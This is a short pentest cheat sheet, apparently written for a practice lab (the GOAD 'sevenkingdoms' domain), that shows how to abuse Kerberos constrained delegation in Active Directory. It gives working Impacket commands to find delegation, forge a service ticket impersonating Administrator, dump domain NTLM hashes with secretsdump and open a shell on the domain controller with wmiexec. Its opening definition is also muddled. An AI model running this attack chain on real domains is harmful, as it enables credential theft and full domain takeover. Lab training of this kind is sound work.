**Constrained Delegation** is a security feature in Active Directory environments where an attacker targets specific services. It works by allowing a service to impersonate users, but only to access predefined services using their Kerberos tickets (TGS—Ticket Granting Service).

### Enumeration

#### Impacket

```bash
findDelegation.py domain.local/username:password -target-domain domain.local
```


![[Pasted image 20240816142743.png]]

#### Bloodhound

![[Pasted image 20240816150123.png]]

### The Attack

Get TGS for the impersonated user:

```bash
getST.py -spn 'CIFS/winterfell' -impersonate Administrator -dc-ip '192.168.56.11' 'north.sevenkingdoms.local/jon.snow:iknownothing'
```

Set environment variable for Kerberos cached credential file:

```bash
export KRB5CCNAME=./Administrator.ccache
```

Verify:

```bash
klist
Ticket cache: FILE:./Administrator.ccache
Default principal: Administrator@north.sevenkingdoms.local

Valid starting     Expires            Service principal
16/08/24 14:28:20  17/08/24 00:28:20  CIFS/winterfell@NORTH.SEVENKINGDOMS.LOCAL
```

Dump Password Hashes:

```bash
secretsdump.py -k -no-pass north.sevenkingdoms.local/administrator@winterfell -just-dc-ntlm
```

Or log into the DC

```bash
wmiexec.py -k -no-pass north.sevenkingdoms.local/administrator@winterfell
```